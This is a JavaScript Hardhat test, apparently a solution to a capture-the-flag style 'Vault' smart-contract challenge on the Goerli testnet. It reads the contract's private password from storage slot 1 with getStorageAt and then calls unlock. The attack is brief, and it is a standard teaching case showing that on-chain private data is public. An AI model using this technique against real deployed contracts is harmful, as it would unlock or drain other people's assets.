const { expect } = require("chai");
const { ethers } = require("hardhat");
const Web3 = require('web3');
const { api_key, private_key } = require('../secrets.json');

describe("Vault", function () {
    
    beforeEach(async function () {
        // Se deploya el contrato
    });
    
    it("Ataque", async function () {
        const contract_address = "0x066Da519F4A170a5FA5f44916794c1DdFaB6f311";
        let contract = await ethers.getContractAt("Vault", contract_address);
        
        // expect(await contract.locked()).to.equal(true);
        
        var web3 = new Web3(`wss://eth-goerli.g.alchemy.com/v2/${api_key}`);
        let password = await web3.eth.getStorageAt(contract_address, 1);

        await contract.unlock(password);
        let locked = await contract.locked();

        expect(locked).to.be.false;
  });

  afterEach(async function() {
    // COMPLETAR
  });

});
